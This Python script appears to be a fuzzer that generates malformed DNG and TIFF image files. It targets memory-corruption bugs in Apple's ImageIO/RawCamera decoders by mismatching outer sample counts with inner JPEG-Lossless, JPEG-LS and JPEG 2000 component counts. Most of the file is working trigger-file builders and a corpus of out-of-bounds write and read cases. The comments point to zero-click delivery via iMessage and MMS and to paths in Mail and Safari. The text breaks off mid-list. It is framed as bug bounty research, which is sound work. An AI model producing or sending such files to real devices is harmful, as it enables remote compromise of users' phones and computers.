#!/usr/bin/env python3
"""
DNG Metadata Mismatch Fuzzer
Target: Apple ImageIO / RawCamera component
Bug class: SamplesPerPixel (TIFF outer layer) vs inner codec component count mismatch
           Same class as CVE-2025-43300 (DNG+JPEG-Lossless, patched Aug 2025)

New targets:
  - DNG + JPEG-Lossless CFA  (compression=7, PhotometricInterpretation=32803)
    SPP=1 outer, Nf > 1 inner → OOB WRITE (more dangerous direction)
  - DNG + JPEG-Lossless LinearRaw (compression=7, PhotometricInterpretation=34892)
    SPP=3 outer, Nf=1 inner → OOB READ / decoder confusion
  - DNG + JPEG 2000 / JPEG-LS retained for completeness

Apple Bug Bounty: https://security.apple.com/bounty/
Attack surface: RawCamera process runs outside BlastDoor sandbox
Trigger vector: Zero-click via iMessage / MMS auto-download

Usage:
  python dng_fuzzer.py --corpus
  python dng_fuzzer.py --codec jpegl --spp 3 --inner 1 --out trigger.dng
  python dng_fuzzer.py --test-corpus      (macOS only -- uses sips)
"""

import struct
import os
import sys
import subprocess
import argparse

# ========================== TIFF/DNG constants ==========================

TIFF_LE_MAGIC = b'II' + struct.pack('<H', 42)

T_SUBFILE_TYPE       = 254
T_IMAGE_WIDTH        = 256
T_IMAGE_LENGTH       = 257
T_BITS_PER_SAMPLE    = 258
T_COMPRESSION        = 259
T_PHOTOMETRIC        = 262
T_STRIP_OFFSETS      = 273
T_SAMPLES_PER_PIXEL  = 277
T_ROWS_PER_STRIP     = 278
T_STRIP_BYTE_COUNTS  = 279
T_X_RESOLUTION       = 282
T_Y_RESOLUTION       = 283
T_PLANAR_CONFIG      = 284
T_RESOLUTION_UNIT    = 296
T_MAKE               = 271
T_MODEL              = 272
T_CFA_REPEAT_DIM     = 33421
T_CFA_PATTERN        = 33422
T_DNG_VERSION        = 50706
T_DNG_BACKWARD_VER   = 50707
T_UNIQUE_CAM_MODEL   = 50708
T_JPEG_TABLES        = 347
T_BLACK_LEVEL        = 50714
T_WHITE_LEVEL        = 50717
T_DEFAULT_SCALE      = 50718
T_DEFAULT_CROP_ORIGIN = 50719
T_DEFAULT_CROP_SIZE  = 50720
T_COLOR_MATRIX1      = 50721
T_AS_SHOT_NEUTRAL    = 50728
T_BASELINE_EXPOSURE  = 50730
T_CALIBRATION_ILLUM1 = 50778

TY_BYTE     = 1
TY_ASCII    = 2
TY_SHORT    = 3
TY_LONG     = 4
TY_RATIONAL = 5
TY_SRATIONAL = 10

COMP_UNCOMPRESSED  = 1
COMP_JPEG_LOSSLESS = 7
COMP_JPEG2000      = 34712
COMP_JPEG_LS       = 34892

PHOTO_MINISBLACK = 1    # Grayscale (white = max value)
PHOTO_RGB        = 2    # Standard RGB
PHOTO_YCBCR      = 6    # YCbCr — routes to multi-component-aware JPEG decoder
PHOTO_CFA        = 32803   # Camera Filter Array (Bayer raw) — SPP always=1
PHOTO_LINEAR_RAW = 34892   # Linear demosaiced raw — SPP typically=3

T_YCBCR_SUBSAMPLING = 530   # [HorizSub, VertSub] — e.g. [2,2] for 4:2:0
T_YCBCR_POSITIONING = 531   # 1=centered, 2=cosited
T_REF_BLACK_WHITE   = 532   # 6 rationals: [Yblack,Ywhite,Cbblack,Cbwhite,Crblack,Crwhite]

# ========================== Two-pass TIFF builder ==========================

class TiffBuilder:
    """
    Correct two-pass TIFF builder.

    Pass 1 (add_* calls): collect all entries as (tag, typ, count, inline_int OR bytes).
    Pass 2 (build):       sort entries, compute the IFD size, assign real offsets to
                          all blob entries, then assemble header + IFD + extra data.

    This avoids the classic bug of computing offsets before knowing the total
    entry count, which makes every data pointer wrong.
    """

    def __init__(self):
        self._items = []
        self._ifd_base = 8  # IFD always starts at byte 8

    def _add(self, tag, typ, count, value):
        self._items.append((tag, typ, count, value))

    def add_short(self, tag, value):
        self._add(tag, TY_SHORT, 1, int(value))

    def add_long(self, tag, value):
        self._add(tag, TY_LONG, 1, int(value))

    def add_short_array(self, tag, values):
        if len(values) == 1:
            self._add(tag, TY_SHORT, 1, int(values[0]))
        else:
            self._add(tag, TY_SHORT, len(values),
                      b''.join(struct.pack('<H', v) for v in values))

    def add_byte_array(self, tag, data):
        data = bytes(data)
        if len(data) <= 4:
            val = int.from_bytes(data.ljust(4, b'\x00'), 'little')
            self._add(tag, TY_BYTE, len(data), val)
        else:
            self._add(tag, TY_BYTE, len(data), data)

    def add_ascii(self, tag, text):
        data = text.encode('ascii') + b'\x00'
        self._add(tag, TY_ASCII, len(data), data)

    def add_rational(self, tag, num, den):
        self._add(tag, TY_RATIONAL, 1, struct.pack('<II', int(num), int(den)))

    def add_srational(self, tag, num, den):
        self._add(tag, TY_SRATIONAL, 1, struct.pack('<ii', int(num), int(den)))

    def add_rational_array(self, tag, pairs):
        data = b''.join(struct.pack('<II', int(n), int(d)) for n, d in pairs)
        self._add(tag, TY_RATIONAL, len(pairs), data)

    def add_srational_array(self, tag, pairs):
        data = b''.join(struct.pack('<ii', int(n), int(d)) for n, d in pairs)
        self._add(tag, TY_SRATIONAL, len(pairs), data)

    def add_strip(self, strip_tag_offset, strip_tag_count, data):
        """Register strip payload; offset is resolved in build()."""
        data = bytes(data)
        self._add(strip_tag_offset, TY_LONG, 1, _StripRef(data))
        self._add(strip_tag_count,  TY_LONG, 1, len(data))

    def build(self):
        items = sorted(self._items, key=lambda x: x[0])
        n = len(items)

        ifd_size   = 2 + n * 12 + 4
        extra_base = self._ifd_base + ifd_size

        extra_data = bytearray()
        ifd_rows   = []
        strip_blobs = {}

        for tag, typ, count, value in items:
            if isinstance(value, _StripRef):
                strip_blobs[tag] = value.data
                ifd_rows.append((tag, typ, count, None))
            elif isinstance(value, bytes):
                offset = extra_base + len(extra_data)
                extra_data += value
                ifd_rows.append((tag, typ, count, offset))
            else:
                ifd_rows.append((tag, typ, count, int(value)))

        strip_offsets = {}
        for tag, data in strip_blobs.items():
            strip_offsets[tag] = extra_base + len(extra_data)
            extra_data += data

        ifd_bytes = struct.pack('<H', n)
        for (tag, typ, count, offset) in ifd_rows:
            real_offset = strip_offsets.get(tag, offset)
            ifd_bytes += struct.pack('<HHII', tag, typ, count, real_offset)
        ifd_bytes += struct.pack('<I', 0)  # no next IFD

        header = TIFF_LE_MAGIC + struct.pack('<I', self._ifd_base)
        return header + ifd_bytes + bytes(extra_data)


class _StripRef:
    def __init__(self, data):
        self.data = bytes(data)


# ========================== Plain TIFF builder (diagnostic + mismatch target) ==========================

def build_plain_tiff(width=8, height=8, spp=1, bits=8,
                     codec=COMP_UNCOMPRESSED, inner_comps=None):
    """
    Plain TIFF — NO DNG tags, standard PhotometricInterpretation.

    When codec=COMP_JPEG_LOSSLESS and inner_comps != spp, this tests the TIFF
    JPEG-Lossless decoder's SPP vs Nf mismatch path — same bug class as
    CVE-2025-43300 but via the standard TIFF plugin (not Camera Raw).

    Since we know the uncompressed TIFF path works (rc=0), a CTRL case with
    codec=JPEGL and inner_comps==spp tells us if sips handles TIFF+JPEGL at all.
    A mismatch case (inner_comps < spp) then tests for the OOB bug.
    """
    if inner_comps is None:
        inner_comps = spp

    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, codec)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)

    if codec == COMP_UNCOMPRESSED:
        payload = bytes(width * height * spp * (bits // 8))
    elif codec == COMP_JPEG_LOSSLESS:
        payload = build_jpegl(width, height, nf=inner_comps, bits=bits)
    else:
        payload = bytes(width * height * spp * (bits // 8))

    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)
    return b.build()


# ========================== TIFF + YCbCr + JPEG-Lossless ==========================

def build_tiff_ycbcr_jpegl(width=64, height=64, spp=3, inner_comps=3):
    """
    TIFF with PhotometricInterpretation=YCbCr (6) + JPEG-Lossless (compression=7).

    YCbCr photometric routes to a multi-component-aware JPEG decoder path.
    Unlike MinIsBlack/RGB which Apple decoded as single-component, the YCbCr
    handler is expected to process Y, Cb, Cr as 3 separate components.

    Mismatch targets:
      spp=3 (TIFF outer — 3-channel YCbCr buffer), inner_comps=1 (SOF3 Nf=1)
      → decoder allocates for 3 channels, iterates over inner_comps=1 → OOB READ
      spp=1 (TIFF outer — 1-channel buffer), inner_comps=3 (SOF3 Nf=3)
      → decoder writes 3 channels into 1-channel buffer → OOB WRITE
    """
    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH,  width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [8] * spp)
    b.add_short(T_COMPRESSION, COMP_JPEG_LOSSLESS)
    b.add_short(T_PHOTOMETRIC, PHOTO_YCBCR)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    # YCbCr required tags
    b.add_short_array(T_YCBCR_SUBSAMPLING, [1, 1])   # 4:4:4 — no subsampling
    b.add_short(T_YCBCR_POSITIONING, 1)               # centered
    b.add_rational_array(T_REF_BLACK_WHITE, [          # standard JFIF/JPEG ranges
        (0, 1), (255, 1),   # Y:  0..255
        (128, 1), (255, 1), # Cb: 128±127
        (128, 1), (255, 1), # Cr: 128±127
    ])
    payload = build_jpegl(width, height, nf=inner_comps, bits=8)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)
    return b.build()


# ========================== Old-style TIFF/JPEG-Lossless (JPEGTables split) ==========================

def build_tiff_jpegl_split(width=64, height=64, spp=1, bits=8, inner_comps=None):
    """
    TIFF/JPEG-Lossless using the split-table format (TIFF Tech Note 2):
      Tag 347 (JPEGTables): SOI + SOF3 + DHT + EOI   (tables only, no scan data)
      Strip data:           SOI + SOS + scan + EOI

    Some decoders locate the SOF3 frame header exclusively in tag 347 rather
    than inside the strip.  If our self-contained strip format is rejected,
    this split format may be accepted by Apple's TIFF/JPEGL decoder.

    inner_comps: Nf in SOF3/SOS (mismatch target when != spp)
    """
    if inner_comps is None:
        inner_comps = spp

    n_cats = bits + 1
    bits_array = [0] * 16
    if n_cats <= 16:
        for k in range(n_cats):
            bits_array[k] = 1
        huffval = list(range(n_cats))
    else:
        for k in range(15):
            bits_array[k] = 1
        bits_array[15] = 2
        huffval = list(range(17))

    dht_payload  = b'\x00'
    dht_payload += bytes(bits_array)
    dht_payload += bytes(huffval)

    # ---- JPEGTables block (tag 347): SOI + SOF3 + DHT + EOI ----
    tables = bytearray()
    tables += b'\xff\xd8'                                    # SOI
    lsof = 8 + 3 * inner_comps
    tables += b'\xff\xc3' + struct.pack('>H', lsof)
    tables += struct.pack('>BHH', bits, height, width)
    tables += struct.pack('>B', inner_comps)
    for i in range(inner_comps):
        tables += struct.pack('>BBB', i + 1, 0x11, 0x00)
    tables += b'\xff\xc4' + struct.pack('>H', 2 + len(dht_payload))
    tables += dht_payload
    tables += b'\xff\xd9'                                    # EOI

    # ---- Strip: SOI + SOS + scan data + EOI ----
    strip = bytearray()
    strip += b'\xff\xd8'                                     # SOI
    lsos = 6 + 2 * inner_comps
    strip += b'\xff\xda' + struct.pack('>H', lsos)
    strip += struct.pack('>B', inner_comps)
    for i in range(inner_comps):
        strip += struct.pack('>BB', i + 1, 0x00)
    strip += b'\x01\x00\x00'                                 # Ss=1, Se=0, Ah/Al=0
    n_bits = width * height * inner_comps
    strip += bytes((n_bits + 7) // 8)                        # all-zero errors (midpoint image)
    strip += b'\xff\xd9'                                     # EOI

    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH,    width)
    b.add_long(T_IMAGE_LENGTH,   height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION,   COMP_JPEG_LOSSLESS)
    b.add_short(T_PHOTOMETRIC,   PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    b.add_byte_array(T_JPEG_TABLES, bytes(tables))
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, bytes(strip))
    return b.build()


# ========================== Plain TIFF + JPEG-LS ==========================

def build_tiff_jpegls(width=64, height=64, spp=3, inner_comps=None):
    """
    Plain TIFF with Compression=34892 (JPEG-LS) — not DNG, no Camera Raw routing.
    JPEG-LS supports multi-component, so Apple's JPEG-LS decoder may iterate over
    all Nf components (unlike the JPEGL decoder which is single-component).

    inner_comps: Nf in SOF55 header (mismatch target when != spp)
    """
    if inner_comps is None:
        inner_comps = spp
    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH,  width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [8] * spp)
    b.add_short(T_COMPRESSION, COMP_JPEG_LS)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS,
                build_jpegls(width, height, nf=inner_comps, bits=8))
    return b.build()


# ========================== JPEG 2000 codestream ==========================

def build_j2k(width, height, csiz, bits=16):
    """
    Minimal JPEG 2000 codestream.
    csiz: Csiz field in SIZ marker = inner component count.
    When csiz < TIFF SamplesPerPixel the decompression loop
    may iterate (SPP / csiz) times too many → OOB write.
    """
    s = bytearray()
    s += b'\xFF\x4F'  # SOC

    lsiz = 38 + 3 * max(csiz, 1)
    s += b'\xFF\x51'
    s += struct.pack('>H', lsiz)
    s += struct.pack('>H', 0)
    s += struct.pack('>I', width)
    s += struct.pack('>I', height)
    s += struct.pack('>I', 0)
    s += struct.pack('>I', 0)
    s += struct.pack('>I', width)
    s += struct.pack('>I', height)
    s += struct.pack('>I', 0)
    s += struct.pack('>I', 0)
    s += struct.pack('>H', max(csiz, 1))  # Csiz <-- INNER METADATA
    for _ in range(max(csiz, 1)):
        s += struct.pack('>B', (bits - 1) & 0x7F)
        s += b'\x01'
        s += b'\x01'

    # COD
    s += b'\xFF\x52'
    cod = bytearray()
    cod += struct.pack('>H', 12)
    cod += b'\x00\x00'
    cod += struct.pack('>H', 1)
    cod += b'\x00\x05\x04\x04\x00\x00'
    s += bytes(cod)

    # QCD
    num_subbands = 1 + 3 * 5
    qcd_inner = b'\x00' + b'\x80\x00' * num_subbands
    s += b'\xFF\x5C'
    s += struct.pack('>H', len(qcd_inner) + 2)
    s += qcd_inner

    # SOT
    s += b'\xFF\x90'
    s += struct.pack('>H', 10)
    s += struct.pack('>H', 0)
    s += struct.pack('>I', 0)
    s += b'\x00\x01'

    # SOD + stub
    s += b'\xFF\x93'
    s += b'\x00' * max(width * max(csiz, 1) * 2, 32)
    s += b'\xFF\xD9'  # EOC

    return bytes(s)


# ========================== JPEG-LS codestream ==========================

def build_jpegls(width, height, nf, bits=8):
    """
    Minimal JPEG-LS codestream.
    nf: number of components in SOF55 = inner component count.
    """
    bits = min(bits, 8)
    nf = max(nf, 1)
    s = bytearray()
    s += b'\xFF\xD8'  # SOI

    lsof = 8 + 3 * nf
    s += b'\xFF\xF7'
    s += struct.pack('>H', lsof)
    s += struct.pack('>B', bits)
    s += struct.pack('>H', height)
    s += struct.pack('>H', width)
    s += struct.pack('>B', nf)  # Nf <-- INNER METADATA
    for i in range(nf):
        s += struct.pack('>B', i + 1)
        s += b'\x11'
        s += b'\x00'

    lsos = 6 + 2 * nf
    s += b'\xFF\xDA'
    s += struct.pack('>H', lsos)
    s += struct.pack('>B', nf)
    for i in range(nf):
        s += struct.pack('>B', i + 1)
        s += b'\x00'
    s += b'\x00\x00\x00'

    s += b'\x00' * max(width * nf, 32)
    s += b'\xFF\xD9'
    return bytes(s)


# ========================== JPEG-Lossless (SOF3) builder ==========================

def build_jpegl(width, height, nf, bits=16):
    """
    JPEG-Lossless (SOF3) stream encoding an all-midpoint image.
    nf: component count in SOF3 = INNER metadata (mismatch target).

    Image: all samples = 2^(P-1) (midpoint of bit depth).
    Predictor Ra (Ss=1): initial Px = 2^(P-1), so every prediction error = 0.
    DHT: unary-code table covering ALL categories 0..(P-1) so decoders that
         validate table completeness before entering the decode loop will accept it.
    Scan data: (w*h*nf) zero bits packed into bytes (all errors = category 0 = '0').
    """
    nf = max(nf, 1)
    s = bytearray()
    s += b'\xFF\xD8'  # SOI

    # SOF3 (JPEG-Lossless frame header)
    lsof = 8 + 3 * nf
    s += b'\xFF\xC3'
    s += struct.pack('>H', lsof)
    s += struct.pack('>B', bits)
    s += struct.pack('>H', height)
    s += struct.pack('>H', width)
    s += struct.pack('>B', nf)       # Nf <-- INNER component count (mismatch target)
    for i in range(nf):
        s += struct.pack('>B', i + 1)  # Ci: component id
        s += b'\x11'                   # H_i=1, V_i=1 (1×1 sampling)
        s += b'\x00'                   # Tq=0 (unused for lossless)

    # DHT: one DC table (Tc=0, Th=0).
    # SSSS (magnitude category) ranges 0..P for P-bit lossless JPEG.
    # Max prediction error = ±(2^P − 1), which needs SSSS=P.
    # Previous code used n_cats=P (0..P-1), missing SSSS=P — decoders that
    # validate DHT completeness before the decode loop reject it (DRAW_FAILED).
    # Fix: include all P+1 categories.
    n_cats = bits + 1   # 0..P inclusive
    bits_array = [0] * 16
    if n_cats <= 16:
        # Unary prefix: one code per length 1..n_cats
        for k in range(n_cats):
            bits_array[k] = 1
        huffval = list(range(n_cats))
    else:
        # P=16 needs 17 categories but BITS[] only supports lengths 1..16.
        # Assign lengths 1..15 to SSSS 0..14, then two codes at length 16
        # for SSSS 15 and 16.
        for k in range(15):
            bits_array[k] = 1
        bits_array[15] = 2
        huffval = list(range(17))
    dht_payload  = b'\x00'                        # Tc=0 (DC), Th=0
    dht_payload += bytes(bits_array)              # BITS[0..15]
    dht_payload += bytes(huffval)                 # HUFFVAL
    s += b'\xFF\xC4'
    s += struct.pack('>H', 2 + len(dht_payload))
    s += dht_payload

    # SOS (Start of Scan)
    lsos = 6 + 2 * nf
    s += b'\xFF\xDA'
    s += struct.pack('>H', lsos)
    s += struct.pack('>B', nf)
    for i in range(nf):
        s += struct.pack('>B', i + 1)  # Cs: component selector
        s += b'\x00'                   # Td=0 (DC table), Ta=0 (unused)
    s += b'\x01'  # Ss=1 (predictor Ra)
    s += b'\x00'  # Se=0
    s += b'\x00'  # Ah=0, Al=0 (no point transform)

    # Scan data: encode w*h*nf prediction errors of 0 (category 0 = '0' bit each).
    # Total bits = w*h*nf; round up to whole bytes; all zeros → no 0xFF stuffing needed.
    n_bits = width * height * nf
    s += bytes((n_bits + 7) // 8)

    s += b'\xFF\xD9'  # EOI
    return bytes(s)


# ========================== DNG assembler ==========================

def build_dng(width=64, height=64, spp=3, inner_comps=1,
              bits=16, codec=COMP_JPEG2000,
              photometric=PHOTO_LINEAR_RAW, outfile=None,
              camera_model=None):
    """
    Assemble a DNG file with deliberate mismatch between:
      TIFF SamplesPerPixel (spp)       -- outer metadata, controls buffer allocation
      inner codec component count      -- inner metadata, controls loop iteration

    photometric=PHOTO_CFA (32803):
      spp=1 always (Bayer sensor), inner_comps > 1 → OOB WRITE (high priority)
    photometric=PHOTO_LINEAR_RAW (34892):
      spp=3 typically (demosaiced), inner_comps=1 → OOB READ / confusion

    camera_model: if given as (make, model) tuple, adds Make/Model EXIF tags +
      sets UniqueCameraModel, which may cause Camera Raw to use cached calibration
      data for a real camera rather than waiting for network/hanging.
    """
    b = TiffBuilder()

    b.add_long(T_SUBFILE_TYPE, 0)
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, codec)
    b.add_short(T_PHOTOMETRIC, photometric)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)

    # CFA-specific tags (only for Bayer/CFA DNG)
    if photometric == PHOTO_CFA:
        b.add_short_array(T_CFA_REPEAT_DIM, [2, 2])
        b.add_byte_array(T_CFA_PATTERN, bytes([0, 1, 1, 2]))  # RGGB Bayer

    # DNG identification
    b.add_byte_array(T_DNG_VERSION,      bytes([1, 4, 0, 0]))
    b.add_byte_array(T_DNG_BACKWARD_VER, bytes([1, 1, 0, 0]))
    if camera_model:
        make, model = camera_model
        b.add_ascii(T_MAKE, make)
        b.add_ascii(T_MODEL, model)
        b.add_ascii(T_UNIQUE_CAM_MODEL, model)
    else:
        b.add_ascii(T_UNIQUE_CAM_MODEL, 'FuzzResearch/ImageIOAudit')

    # DNG Camera Raw mandatory tags
    b.add_rational_array(T_DEFAULT_SCALE,       [(1, 1), (1, 1)])
    b.add_rational_array(T_DEFAULT_CROP_ORIGIN, [(0, 1), (0, 1)])
    b.add_rational_array(T_DEFAULT_CROP_SIZE,   [(width, 1), (height, 1)])
    # ColorMatrix1: approximate identity in camera-to-XYZ space (9 SRATIONALs)
    identity_cm = [(10000, 10000), (0, 1), (0, 1),
                   (0, 1), (10000, 10000), (0, 1),
                   (0, 1), (0, 1), (10000, 10000)]
    b.add_srational_array(T_COLOR_MATRIX1, identity_cm)
    b.add_short(T_CALIBRATION_ILLUM1, 21)  # D65
    # AsShotNeutral: ALWAYS 3 values (R, G, B neutral point for the camera model).
    # Using spp here was wrong — the DNG spec defines this as 3 regardless of SPP.
    b.add_rational_array(T_AS_SHOT_NEUTRAL, [(1, 1), (1, 1), (1, 1)])
    b.add_srational(T_BASELINE_EXPOSURE, 0, 1)
    b.add_short(T_BLACK_LEVEL, 0)
    b.add_long(T_WHITE_LEVEL, (1 << bits) - 1)

    if codec == COMP_UNCOMPRESSED:
        payload = bytes(width * height * spp * (bits // 8))
        label = 'Uncompressed'
    elif codec == COMP_JPEG2000:
        payload = build_j2k(width, height, csiz=inner_comps, bits=bits)
        label = f'J2K csiz={inner_comps}'
    elif codec == COMP_JPEG_LS:
        payload = build_jpegls(width, height, nf=inner_comps, bits=min(bits, 8))
        label = f'JPEG-LS nf={inner_comps}'
    elif codec == COMP_JPEG_LOSSLESS:
        payload = build_jpegl(width, height, nf=inner_comps, bits=bits)
        label = f'JPEG-L nf={inner_comps}'
    else:
        raise ValueError(f'Unknown codec: {codec}')

    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)

    data = b.build()

    if outfile:
        with open(outfile, 'wb') as f:
            f.write(data)

        alloc = width * height * spp * (bits // 8)
        if 0 < inner_comps < spp:
            write   = alloc * (spp // inner_comps)
            overflow = write - alloc
        elif inner_comps > spp > 0:
            write   = alloc
            overflow = width * height * (inner_comps - spp) * (bits // 8)
        else:
            write = alloc
            overflow = 0

        photo_name = {PHOTO_CFA: 'CFA', PHOTO_LINEAR_RAW: 'LinearRaw',
                      PHOTO_MINISBLACK: 'Gray', PHOTO_RGB: 'RGB'}.get(photometric, str(photometric))
        print(f'\n[+] {outfile}')
        print(f'    Codec:         {label}  Photo: {photo_name}')
        print(f'    Dimensions:    {width} x {height}   BitsPerSample: {bits}')
        print(f'    TIFF SPP:      {spp}   (outer -- controls malloc size)')
        print(f'    Inner comps:   {inner_comps}   (inner -- controls loop count)')
        print(f'    File size:     {len(data):,} bytes')
        print(f'    Alloc (est):   {alloc:,} bytes')
        print(f'    OOB est:       {overflow:,} bytes')

    return data


# ========================== Corpus ==========================

# (width, height, spp, inner_comps, bits, codec, name, photometric)
CORPUS = [
    # ---- CFA DNG (PhotometricInterpretation=32803, SPP=1 always) ----
    # The OOB-WRITE direction: inner_comps > spp(=1) → alloc for 1, loop over inner_comps
    # CTRL: spp==nf=1, should decode cleanly
    (64,  64,  1, 1, 16, COMP_JPEG_LOSSLESS, 'CTRL_cfa_jpegl_1spp_1nf_16b',  PHOTO_CFA),
    # Mismatch targets: Nf > SPP → OOB write into adjacent allocations
    (64,  64,  1, 2, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_2nf_16b',       PHOTO_CFA),
    (64,  64,  1, 3, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_3nf_16b',       PHOTO_CFA),
    (64,  64,  1, 4, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_4nf_16b',       PHOTO_CFA),
    (256, 256, 1, 3, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_3nf_16b_256',   PHOTO_CFA),
    (512, 512, 1, 3, 16, COMP_JPEG_LOSSLESS, 'cfa_jpegl_1spp_3nf_16b_512',   PHOTO_CFA),

    # ---- LinearRaw DNG (PhotometricInterpretation=34892, SPP=3) ----
    # The OOB-READ / confusion direction: inner_comps < spp
    # CTRL: spp==nf=3
    (64,  64,  3, 3, 16, COMP_JPEG_LOSSLESS, 'CTRL_lr_jpegl_3spp_3nf_16b',   PHOTO_LINEAR_RAW),
    # Mismatch: SPP=3 outer, Nf=1 inner
    (64,  64,  3, 1, 16, COMP_JPEG_LOSSLESS, 'lr_jpegl_3spp_1nf_16b',        PHOTO_LINEAR_RAW),
    (256, 256, 3, 1, 16, COMP_JPEG_LOSSLESS, 'lr_jpegl_3spp_1nf_16b_256',    PHOTO_LINEAR_RAW),
    (64,  64,  4, 1, 16, COMP_JPEG_LOSSLESS, 'lr_jpegl_4spp_1nf_16b',        PHOTO_LINEAR_RAW),

    # ---- Uncompressed DNG baselines (should decode if DNG tags are accepted) ----
    (8,   8,   1, 1, 16, COMP_UNCOMPRESSED,  'DIAG_dng_cfa_uncompressed',     PHOTO_CFA),
    (8,   8,   3, 3, 16, COMP_UNCOMPRESSED,  'DIAG_dng_lr_uncompressed',      PHOTO_LINEAR_RAW),

    # ---- JPEG-LS mismatch (retained) ----
    (64,  64,  1, 1,  8, COMP_JPEG_LS, 'CTRL_cfa_jpegls_1spp_1nf_8b',        PHOTO_CFA),
    (64,  64,  1, 3,  8, COMP_JPEG_LS, 'cfa_jpegls_1spp_3nf_8b',             PHOTO_CFA),
    (256, 256, 1, 3,  8, COMP_JPEG_LS, 'cfa_jpegls_1spp_3nf_8b_256',         PHOTO_CFA),

    # ---- J2K (likely unsupported but retained) ----
    (64,  64,  3, 1, 16, COMP_JPEG2000, 'j2k_lr_3spp_1csiz_16b',             PHOTO_LINEAR_RAW),

    # ---- DNG + standard photometric (Gray / RGB) + JPEGL ----
    # DIAGNOSTIC: does Camera Raw routing depend on CFA/LR photometric specifically?
    # If [OK+RENDER] OK_MIDPOINT → TIFF plugin handles DNG+Gray/RGB (routing is photo-specific)
    # If [NO_IMG]               → ANY DNG tag causes routing failure (photometric irrelevant)
    (64,  64,  1, 1,  8, COMP_JPEG_LOSSLESS, 'CTRL_dng_gray_jpegl_1spp_1nf_8b', PHOTO_MINISBLACK),
    (64,  64,  1, 3,  8, COMP_JPEG_LOSSLESS, 'diag_dng_gray_jpegl_1spp_3nf_8b', PHOTO_MINISBLACK),
    (64,  64,  3, 3,  8, COMP_JPEG_LOSSLESS, 'CTRL_dng_rgb_jpegl_3spp_3nf_8b',  PHOTO_RGB),
    (64,  64,  3, 1,  8, COMP_JPEG_LOSSLESS, 'diag_dng_rgb_jpegl_3spp_1nf_8b',  PHOTO_RGB),
]


def generate_corpus(outdir='corpus'):
    os.makedirs(outdir, exist_ok=True)

    # ---- Plain uncompressed TIFF diagnostics (confirm TiffBuilder is correct) ----
    plain_uncompressed = [
        ('DIAG_plain_tiff_gray_8b',  build_plain_tiff(8, 8, spp=1, bits=8)),
        ('DIAG_plain_tiff_rgb_8b',   build_plain_tiff(8, 8, spp=3, bits=8)),
        ('DIAG_plain_tiff_rgb_16b',  build_plain_tiff(8, 8, spp=3, bits=16)),
    ]
    print('[*] Plain uncompressed TIFF (structural baseline):')
    for name, data in plain_uncompressed:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- Plain TIFF + JPEG-Lossless (PRIMARY ATTACK SURFACE) ----
    # The TIFF JPEG-Lossless decode path IS reachable (proven by 16-bit run:
    # "Unable to write image" = decode succeeded, PNG export failed for 16-bit).
    # Using 8-bit so sips can export to PNG — this lets us see if decode crashes.
    #
    # Attack surface: any TIFF file processed by ImageIO (Mail, Messages, Photos,
    # Safari image preview, etc.). Not limited to DNG/Camera Raw path.
    tiff_jpegl_cases = [
        # --- 8-bit: CTRL (SPP == Nf) — MUST return rc=0 to confirm codec path ---
        ('CTRL_tiff_jpegl_3spp_3nf_8b',
